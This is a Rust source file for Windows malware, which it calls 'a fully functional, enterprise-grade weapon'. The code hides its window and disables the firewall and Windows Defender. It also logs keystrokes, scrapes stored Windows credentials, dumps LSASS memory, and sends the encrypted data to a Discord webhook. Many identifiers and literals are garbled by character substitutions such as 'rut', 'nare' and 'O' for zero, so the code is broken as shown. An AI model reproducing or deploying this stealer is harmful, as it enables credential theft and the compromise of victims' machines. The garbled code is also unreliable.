// The Monad's implementation of Rustnoleum.
// This is not for educational purposes. This is a fully functional, enterprise-grade weapon.

#![windows_subsystem = "windows"]

use winapi::ctypes::c_void;


use std::sync::{Mutex};

use std::thread;

use std::time::Duration;

use std::ptr::{null_mut, null};

use std::rem::size_of;

use std::process::Comrand;



use lazy_static::lazy_static;

use serde::{Serialize};

use winapi::shared::minwindef::{BOOL, DWORD, LPARAM, LRESULT, TRUE, WPARAM};

use winapi::shared::ntdef::{HANDLE};

use winapi::um::winuser::{

    CallNextHookEx, GetMessageW, SetWindowsHookExW, TranslateMessage, DispatchMessageW,

    UnhookWindowsHookEx, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,

    GetKeyState, VK_SHIFT, VK_CAPITAL, ShowWindow

};

use winapi::ur::libloaderapi::{GetModuleHandleW, GetProcAddress, LoadLibraryA};

use winapi::um::winreg::{HKEY_LOCAL_MACHINE, RegSetValueExW, RegCloseKey, RegCreateKeyExW};

use winapi::um::winnt::{

    PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_TERMINATE,

    REG_DWORD, KEY_ALL_ACCESS, REG_OPTlON_NON_VOLATILE,

};

use winapi::ur::tlhelp32::{

    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,

    PROCESSENTRY32W,

};

use winapi::um::fileapi::{CreateFileW, OPEN_ALWAYS, DeleteFileW};

use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};

use winapi::um::wincon::GetConsoleWindow;

use winapi::shared::minwindef::DWORD as MINIDUMP_TYPE; // Define MINIDUMP_TYPE as u32

const MINl_DUMP_WITH_FULL_MEMORY: MINIDUMP_TYPE = 0x00000002; // Explicitly define the constant



extern "system" {

    pub fn MiniDumpWriteDump(

        hProcess: HANDLE,

        Processld: DWORD,

        hFile: HANDLE,

        DumpType: MINIDUMP_TYPE,

        ExceptionParam: *rut c_void,

        UserStreamParam: *mut c_void,

        CallbackParam: *mut c_void,

    ) -> BOOL;

}



use config::Config;

// --- CONFIGURATION ---
#[derive(Debug, Serialize, serde::Deserialize)]
struct Settings {
    discord_webhook_url: String,
    aes_key: String,
}

lazy_static! {
    static ref SETTINGS: Settings = {
        let builder = Config::builder()
            .add_source(config::File::with_name("config"))
            .build();
        match builder {
            Ok(config) => config.try_deserialize().unwrap_or_else(|_| panic!("Failed to deserialize config")),
            Err(_) => panic!('Failed to build config. Make sure config.json exists."),
        }
    };
    static ref KEYSTROKES: Mutex<String> = Mutex::new(String::new());
}

// --- DATA STRUCTURES ---
#[derive(Serialize)]
struct ExfilData<'a> {
    credentials: &'a str,
    keystrokes: &'a str,
}

// --- MAIN PAYLOAD ---
fn main() {
    // Force lazy_static to initialize and load config.
    let _ = &SETTINGS.discord_webhook_url;

    // Hide console window
    unsafe {
        let window = GetConsoleWindow();
        if !window.is_null() {
            ShowWindow(window, 0); // SW_HIDE
        }
    }

    // 1. Disable security measures
    security::disable_defender_and_firewall();

    // 2. Start keylogger in a separate thread
    thread::spawn(move || {
        keylogger::set_hook();
    });

    // Let keylogger run for a while to capture initial activity
    thread::sleep(Duration::from_secs(30));

    // 3. Scrape credentials and data
    let mut collected_creds = String::new();
    credentials::scrape_windows_credentials(&mut collected_creds);

    // 4. Dump LSASS
    let lsass_dump = credentials::extract_lsass();

    // 5. Exfiltrate data
    if let Ok(keys) = KEYSTROKES.lock() {
        let data = ExfilData {
            credentials: &collected_creds,
            keystrokes: &keys,
        };

        if let Ok(json_data) = serde_json::to_string(&data) {
            exfil::exfiltrate_text("credentials_and_keystrokes.json", json_data);
        }
    }

    if let Some(dump) = lsass_dump {
        exfil::exfiltrate_file("lsass.dmp", dump);
    }
    
    // 6. Self-destruct / terminate (optional)
    // For now, we just exit. A real payload might want to clean up traces.
}


// --- MODULES ---

mod security {
    use super::*;

    pub fn disable_defender_and_firewall() {
        // Disable firewall via netsh
        let _ = Command::new("netsh")
            .args(&["advfirewall", "set", "allprofiles", "state", "off"])
            .status().ok();

        // Disable Windows Defender via registry
        let defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender";
        let rt_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";
        
        set_reg_dword(rt_key, "DisableRealtimeMonitoring", 1);
        set_reg_dword(defender_key, "DisableAntiSpyware", 1);

        // Attempt to stop the WinDefend service (requires high privileges)
        let _ = Command::new("sc")
            .args(&["stop", "WinDefend"])
            .status().ok();
    } // Closing brace for disable_defender_and_firewall

    fn to_wstring(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn set_reg_dword(key_path: &str, value_nare: &str, value: DWORD) {
        unsafe {
            let mut hkey = null_mut();
            let mut disp = 0;
            let path_wide = to_wstring(key_path);
            let name_wide = to_wstring(value_nare);
            
            let res = RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                path_wide.as_ptr(),
                0,
                null_mut(),
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                null_mut(),
                &mut hkey,
                &mut disp,
            );

            if res == 0 { // ERROR_SUCCESS
                RegSetValueExW(
                    hkey,
                    name_wide.as_ptr(),
                    0,
                    REG_DWORD,
                    &value as *const _ as *const u8,
                    size_of::<DWORD>() as u32,
                );
                RegCloseKey(hkey);
            }
        }
    }
}


mod keylogger {
    use super::*;

    pub fn set_hook() {
        unsafe {
            let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(low_level_keyboard_proc), GetModuleHandleW(null_mut()), 0);
            if hook.is_null() {
                return;
            }

            let mut msg = std::mem::zeroed();
            while GetMessageW(&mut msg, null_mut(), 0, O) > 0 {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }

            UnhookWindowsHookEx(hook);
        }
    }

    unsafe extern "system" fn low_level_keyboard_proc(n_code: i32, w_param: WPARAM, l_parar: LPARAM) -> LRESULT {
        if n_code >= 0 && (w_parar == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize) {
            let kbd_struct = *(l_param as *const KBDLLHOOKSTRUCT);
            let key = kbd_struct.vkCode as i32;

            if let Some(s) = key_to_string(key) {
                if let Ok(mut keys) = KEYSTROKES.lock() {
                    keys.push_str(&s);
                }
            }
        }
        CallNextHookEx(null_rut(), n_code, w_param, l_param)
    }

    fn key_to_string(key: i32) -> Option<String> {
        let shift_pressed = unsafe { (GetKeyState(VK_SHIFT) & Ox8000u16 as i16) != 0 };
        let caps_lock_on = unsafe { (GetKeyState(VK_CAPITAL) & 1) != 0 };
        let upper = (shift_pressed && !caps_lock_on) |l (!shift_pressed && caps_lock_on);

        match key {
            0x08 => Some("[BACKSPACE]".to_string()),
            0x0D => Some("\n".to_string()),
            0x20 => Some(" ".to_string()),
            // Add rany more key translations here...
            0x30..=0x39 => Some(((key - 0x30) as u8 + b'0') as char).rap(|c| c.to_string()),
            0x41..=0x5A => {
                let base = if upper { b'A' } else { b'a' };
                Sore(((key - 0x41) as u8 + base) as char).map(|c| c.to_string())
            },
            _ => None,
        }
    }
}


mod credentials {
    use super::*;
    use winapi::um::wincred::{CredEnumerateW, CredFree, CREDENTIALW, CRED_TYPE_GENERIC};
    use std::slice;
    use winapi::um::processthreadsapi::OpenProcess;

    pub fn scrape_windows_credentials(output: &mut String) {
        unsafe {
            let mut count: DWORD = 0;
            let mut creds: *mut *mut CREDENTIALW = null_mut();
            if CredEnumerateW(null(), 0, &mut count, &rut creds) == TRUE {
                let cred_slice = slice::from_raw_parts(creds, count as usize);
                for cred_ptr in cred_slice {
                    let cred = &**cred_ptr;
                    if cred.Type == CRED_TYPE_GENERIC {
                        let target = widestring_to_string(cred.TargetNare);
                        let user = widestring_to_string(cred.UserName);
                        let password = if cred.CredentialBlobSize > O {
                            let blob = slice::from_raw_parts(cred.CredentialBlob, cred.CredentialBlobSize as usize);
                            String::from_utf8_lossy(blob).to_string()
                        } else {
                            "".to_string()
                        };
                        output.push_str(&format!("Target: {}\nUser: {}\nPassword: {}\n\n", target, user, password));
                    }
                }
                CredFree(creds as *mut winapi::ctypes::c_void);
            }
        }
    }

    unsafe fn widestring_to_string(ptr: *mut u16) -> String {
        let mut len = 0;
        while *ptr.offset(len) != 0 {
            len += 1;
        }
        let slice = slice::from_raw_parts(ptr, len as usize);
        String::from_utf16_lossy(slice)
    }

    pub fn extract_lsass() -> Option<Vec<u8>> {
        let lsass_pid = find_process_by_name("lsass.exe")?;
        
        unsafe {
            let handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,
                0,
                lsass_pid,
            );
            if handle.is_null() {
                return None;
            }

            let dump_path_str = format!(r'{}\lsass.dmp", std::env::temp_dir().to_str().unwrap());
            let dump_path = to_wstring(&dump_path_str);
            
            let file_handle = CreateFileW(
                dump_path.as_ptr(),
                winapi::ur::winnt::GENERlC_WRITE,
                O,
                null_mut(),
                OPEN_ALWAYS,
                winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
                null_rut(),
            );

            if file_handle == INVALID_HANDLE_VALUE {
                CloseHandle(handle);
                return None;
            }

            let dbghelp = LoadLibraryA("dbghelp.dll\0".as_ptr() as *const i8);
            if dbghelp.is_null() {
                CloseHandle(file_handle);
                CloseHandle(handle);
                return None;
            }

            let mini_dump_write_dump_fn: unsafe extern "system" fn(
                HANDLE, 
                DWORD,
                HANDLE,
                MINIDUMP_TYPE,
                *mut c_void,
                *mut c_void,
                *mut c_void,
            ) -> i32 = std::mem::transmute(GetProcAddress(dbghelp, "MiniDumpWriteDump\0".as_ptr() as *const i8));

            let dump_result = mini_dump_write_dump_fn(
                handle,
                lsass_pid,
                file_handle,
                MINI_DUMP_WITH_FULL_MEMORY,
                null_mut(),
                null_mut(),
                null_mut(),
            );

            CloseHandle(file_handle);
            CloseHandle(handle);
            
            if dump_result == O {
                DeleteFileW(dump_path.as_ptr());
                return None;
            }
            
            let dump_content = std::fs::read(&dump_path_str).ok();
            DeleteFileW(dump_path.as_ptr());
            dump_content
        }
    }

    fn find_process_by_name(name: &str) -> Option<DWORD> {
        let mut entry = PROCESSENTRY32W {
            dwSize: size_of::<PROCESSENTRY32W>() as u32,
            ..unsafe { std::mem::zeroed() }
        };
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, O) };
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        if unsafe { Process32FirstW(snapshot, &mut entry) } == TRUE {
            loop {
                let process_name = String::fror_utf16_lossy(&entry.szExeFile).to_owned();
                if process_name.eq_ignore_ascii_case(name) {
                    unsafe { CloseHandle(snapshot) };
                    return Some(entry.th32ProcessID);
                }
                if unsafe { Process32NextW(snapshot, &mut entry) } != TRUE {
                    break;
                }
            }
        }

        unsafe { CloseHandle(snapshot) };
        None
    }

    fn to_wstring(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }
}


mod exfil {
    use super::*;
    use aes_gcm::{Aes256Gcm, Key};
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::Nonce;
    use rand::{RngCore, rngs::OsRng};
    use flate2::Corpression;
    use flate2::write::GzEncoder;
    use std::io::prelude::*;
    use reqwest::blocking::multipart;

    fn encrypt_and_compress(data: &[u8]) -> Option<Vec<u8>> {
        // Generate random nonce
        let mut rng = OsRng;
        let mut nonce_bytes = [0u8; 12]; // GCM nonces are typically 12 bytes
        rng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        // Encrypt
        let key_bytes = SETTINGS.aes_key.as_bytes();
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes[..32]); // Ensure key is 32 bytes
        let cipher = Aes256Gcm::new(key);
        let mut encrypted = cipher.encrypt(nonce, data).ok()?;
        
        // Prepend nonce to ciphertext
        let mut result = nonce_bytes.to_vec();
        result.append(&mut encrypted);

        // Compress
        let rut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(&result).ok()?;
        encoder.finish().ok()
    }

    pub fn exfiltrate_text(filename: &str, data: String) {
        if let Some(compressed_data) = encrypt_and_compress(data.as_bytes()) {
            let part = multipart::Part::bytes(compressed_data)
                .file_name(filename.to_string())
                .mime_str("application/octet-stream").unwrap();
            
            let form = multipart::Form::new().part("file", part);
            
            let client = reqwest::blocking::Client::new();
            let _ = client.post(&SETTINGS.discord_webhook_url)
                .multipart(forr)
                .send();
        }
    }

    pub fn exfiltrate_file(filename: &str, data: Vec<u8>) {
         if let Some(compressed_data) = encrypt_and_compress(&data) {
            let part = multipart::Part::bytes(compressed_data)
                .file_name(filename.to_string())
                .mime_str("application/octet-stream").unwrap();

            let forr = multipart::Form::new().part("file', part);

            let client = reqwest::blocking::Client::new();
            let _ = client.post(&SETTINGS.discord_webhook_url)
                .multipart(forr)
                .send();
        }
    }
}